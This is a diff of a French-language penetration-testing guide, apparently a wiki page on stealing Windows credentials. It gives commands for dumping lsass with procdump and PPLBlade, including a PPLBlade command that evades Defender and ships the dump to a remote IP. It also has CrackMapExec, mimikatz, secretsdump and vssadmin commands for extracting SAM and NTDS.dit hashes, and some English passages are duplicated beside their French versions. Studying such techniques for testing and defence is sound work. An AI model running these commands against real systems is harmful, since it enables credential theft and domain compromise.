@@ -59,7 +59,7 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil légitime de Microsoft**, il n'est pas détecté par Defender.\
+Comme **Procdump de** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil légitime de Microsoft**, il n'est pas détecté par Defender.\
 Vous pouvez utiliser cet outil pour **extraire le processus lsass**, **télécharger le dump** et **extraire** les **informations d'identification localement** à partir du dump.
 
 {% code title="Extraire lsass" %}
@@ -110,19 +110,25 @@ Nous devons simplement garder à l'esprit que cette technique ne peut être exé
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-CrackMapExec is a powerful tool used for various hacking techniques. One of its capabilities is the ability to dump SAM hashes. SAM (Security Account Manager) is a database file in Windows that stores user account information, including password hashes.
+## Dumpin lsass avec PPLBlade
 
-To dump SAM hashes using CrackMapExec, you can use the following command:
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de dumping de processus protégé qui prend en charge l'obfuscation des fichiers de vidage de mémoire et leur transfert sur des postes de travail distants sans les déposer sur le disque.
 
+**Fonctionnalités clés**:
+
+1. Contournement de la protection PPL
+2. Obfuscation des fichiers de vidage de mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
+3. Téléchargement du vidage de mémoire avec les méthodes de téléchargement RAW et SMB sans le déposer sur le disque (vidage sans fichier)
+
+{% code overflow="wrap" %}
+```bash
+PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
-crackmapexec <target> -u <username> -p <password> --sam
-```
+{% endcode %}
 
-Replace `<target>` with the IP address or hostname of the target machine. `<username>` and `<password>` should be replaced with valid credentials for authentication.
+## CrackMapExec
 
-This command will initiate the dumping process and retrieve the SAM hashes from the target machine. These hashes can then be used for further analysis and potential password cracking.
-
-It is important to note that dumping SAM hashes without proper authorization is illegal and unethical. This technique should only be used for legitimate purposes, such as penetration testing or authorized security assessments.
+### Extraire les hachages SAM
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -134,7 +140,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 
 Le vol des secrets LSA est une technique couramment utilisée pour extraire les informations d'identification stockées localement sur un système Windows. Les secrets LSA (Local Security Authority) sont des données sensibles telles que les mots de passe enregistrés, les clés de chiffrement et les jetons d'authentification.
 
-Cette technique consiste à extraire les secrets LSA à partir de la mémoire du système, ce qui permet aux attaquants d'accéder aux informations d'identification des utilisateurs et de les utiliser pour compromettre davantage le système.
+Cette technique consiste à extraire les secrets LSA à partir de la mémoire du système, ce qui permet aux attaquants d'accéder aux informations d'identification des utilisateurs et de les utiliser pour compromettre d'autres systèmes ou services.
 
 #### Méthode
 
@@ -148,21 +154,21 @@ Cette technique consiste à extraire les secrets LSA à partir de la mémoire du
 
    Cette commande utilise l'outil Mimikatz pour extraire les secrets LSA à partir de la mémoire du système.
 
-3. Les informations d'identification volées seront affichées dans la sortie de la commande. Recherchez les champs "Nom d'utilisateur" et "Mot de passe" pour obtenir les informations d'identification.
+3. Les informations d'identification volées seront affichées dans la sortie de la commande. Notez que vous aurez besoin des privilèges d'administrateur pour exécuter cette commande avec succès.
 
 #### Contre-mesures
 
-Pour protéger les secrets LSA contre le vol, vous pouvez prendre les mesures suivantes :
+Pour protéger vos systèmes contre le vol des secrets LSA, vous pouvez prendre les mesures suivantes :
 
 - Mettez à jour régulièrement votre système d'exploitation avec les derniers correctifs de sécurité.
 
-- Utilisez des mots de passe forts et uniques pour tous les comptes d'utilisateur.
+- Utilisez des mots de passe forts et changez-les régulièrement.
 
-- Activez la fonctionnalité de chiffrement du disque pour protéger les données sensibles.
+- Limitez les privilèges d'administrateur aux utilisateurs autorisés uniquement.
 
-- Utilisez des outils de détection d'intrusion pour surveiller les activités suspectes sur le système.
+- Utilisez des outils de détection d'intrusion pour surveiller les activités suspectes sur votre réseau.
 
-- Restreignez les privilèges d'accès aux comptes d'utilisateur pour limiter les possibilités d'exploitation.
+- Mettez en œuvre des solutions de chiffrement pour protéger les données sensibles.
 
 ---
 
@@ -178,33 +184,33 @@ Pour extraire le fichier NTDS.dit du contrôleur de domaine cible (DC), vous pou
 
 ### Extracting Hashes from NTDS.dit
 
-Once you have obtained the NTDS.dit file, you can extract the password hashes stored within it. These password hashes can be cracked or used for further attacks, such as pass-the-hash or password spraying.
+Once you have obtained the NTDS.dit file, you can extract the password hashes stored within it. These password hashes can be cracked or used for further attacks, such as pass-the-hash attacks.
 
-Une fois que vous avez obtenu le fichier NTDS.dit, vous pouvez extraire les empreintes de mots de passe qui y sont stockées. Ces empreintes de mots de passe peuvent être craquées ou utilisées pour d'autres attaques, telles que le pass-the-hash ou le password spraying.
+Une fois que vous avez obtenu le fichier NTDS.dit, vous pouvez extraire les empreintes de mots de passe qui y sont stockées. Ces empreintes de mots de passe peuvent être craquées ou utilisées pour d'autres attaques, telles que les attaques pass-the-hash.
 
 ### Cracking Password Hashes
 
-To crack the password hashes extracted from the NTDS.dit file, you can use tools like `hashcat` or `John the Ripper`. These tools utilize various cracking techniques, such as dictionary attacks or brute-force attacks, to recover the original passwords.
+To crack the password hashes extracted from the NTDS.dit file, you can use tools like `John the Ripper` or `Hashcat`. These tools utilize various techniques, such as dictionary attacks or brute-force attacks, to crack the passwords.
 
-Pour craquer les empreintes de mots de passe extraites du fichier NTDS.dit, vous pouvez utiliser des outils tels que `hashcat` ou `John the Ripper`. Ces outils utilisent différentes techniques de craquage, telles que les attaques par dictionnaire ou les attaques par force brute, pour récupérer les mots de passe d'origine.
+Pour craquer les empreintes de mots de passe extraites du fichier NTDS.dit, vous pouvez utiliser des outils tels que `John the Ripper` ou `Hashcat`. Ces outils utilisent différentes techniques, telles que les attaques par dictionnaire ou les attaques par force brute, pour craquer les mots de passe.
 
 ### Protecting NTDS.dit
 
-To protect the NTDS.dit file and prevent unauthorized access, it is crucial to implement proper security measures. Some recommended practices include:
+To protect the NTDS.dit file and prevent unauthorized access, it is important to implement proper security measures. Some recommended measures include:
 
-- Regularly patching and updating the Domain Controllers to mitigate vulnerabilities.
+- Regularly patching and updating the Domain Controllers to ensure they are running the latest security updates.
 - Implementing strong password policies and enforcing regular password changes.
 - Limiting administrative privileges and implementing the principle of least privilege.
 - Monitoring and auditing the access to the NTDS.dit file.
-- Encrypting the NTDS.dit file using technologies like BitLocker.
+- Implementing intrusion detection and prevention systems to detect and prevent unauthorized access attempts.
 
-Pour protéger le fichier NTDS.dit et empêcher tout accès non autorisé, il est crucial de mettre en place des mesures de sécurité appropriées. Voici quelques pratiques recommandées :
+Pour protéger le fichier NTDS.dit et empêcher tout accès non autorisé, il est important de mettre en place des mesures de sécurité appropriées. Voici quelques mesures recommandées :
 
-- Appliquer régulièrement les correctifs et les mises à jour sur les contrôleurs de domaine pour atténuer les vulnérabilités.
+- Appliquer régulièrement les correctifs et les mises à jour sur les contrôleurs de domaine pour s'assurer qu'ils exécutent les dernières mises à jour de sécurité.
 - Mettre en place des politiques de mots de passe solides et imposer des changements de mot de passe réguliers.
 - Limiter les privilèges administratifs et mettre en œuvre le principe du moindre privilège.
 - Surveiller et auditer l'accès au fichier NTDS.dit.
-- Chiffrer le fichier NTDS.dit à l'aide de technologies telles que BitLocker.
+- Mettre en place des systèmes de détection et de prévention des intrusions pour détecter et empêcher les tentatives d'accès non autorisées.
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
@@ -226,7 +232,7 @@ Here's an example using `mimikatz`:
    mimikatz # privilege::debug
    ```
 
-7. Next, use the following command to dump the NTDS.dit password history:
+7. Then, execute the following command to dump the NTDS.dit password history:
 
    ```
    mimikatz # lsadump::sam /system:C:\Windows\system32\config\SYSTEM /security:C:\Windows\system32\config\SECURITY /ntds:C:\Windows\NTDS\NTDS.dit /passwordhistory
@@ -234,7 +240,7 @@ Here's an example using `mimikatz`:
 
    Replace the paths with the correct locations of the respective files on the target machine.
 
-8. `mimikatz` will then extract the password hashes, including the password history, from the NTDS.dit database.
+8. The password history, including the hashes, will be displayed in the output.
 
 Remember to always perform these actions within a legal and authorized context, such as during a penetration test or with proper consent.
 ```
@@ -271,7 +277,7 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Vous pouvez effectuer une copie des fichiers protégés en utilisant ce service. Vous devez être administrateur.
+Vous pouvez effectuer une copie des fichiers protégés en utilisant ce service. Vous devez être Administrateur.
 
 #### Utilisation de vssadmin
 
@@ -318,7 +324,7 @@ Ce fichier est une base de données _Extensible Storage Engine_ (ESE) et est "of
 
 Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ainsi, une **partie** du fichier **NTDS.dit** pourrait être située **à l'intérieur de la mémoire de `lsass`** (vous pouvez trouver les données les plus récemment consultées probablement en raison de l'amélioration des performances grâce à une **mise en cache**).
+Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ainsi, une **partie** du fichier **NTDS.dit** pourrait être située **à l'intérieur de la mémoire de `lsass`** (vous pouvez trouver les données les plus récemment consultées probablement en raison de l'amélioration des performances grâce à un **cache**).
 
 #### Décryptage des hachages à l'intérieur de NTDS.dit
 
@@ -362,7 +368,7 @@ La ruche `SYSTEM` est facultative mais permet le décryptage des secrets (hachag
 
 ## Lazagne
 
-Téléchargez le binaire à partir de [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des informations d'identification de plusieurs logiciels.
+Téléchargez le binaire à partir de [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des informations d'identification à partir de plusieurs logiciels.
 ```
 lazagne.exe all
 ```
@@ -389,13 +395,11 @@ type outpwdump
 ```
 ### PwDump7
 
-Téléchargez-le depuis: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) et **exécutez-le** simplement pour extraire les mots de passe.
+Téléchargez-le depuis: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) et **exécutez-le** simplement et les mots de passe seront extraits.
 
 ## Défenses
 
 [**Apprenez-en plus sur certaines protections des identifiants ici.**](credentials-protections.md)
-
-
 
 <details>
 
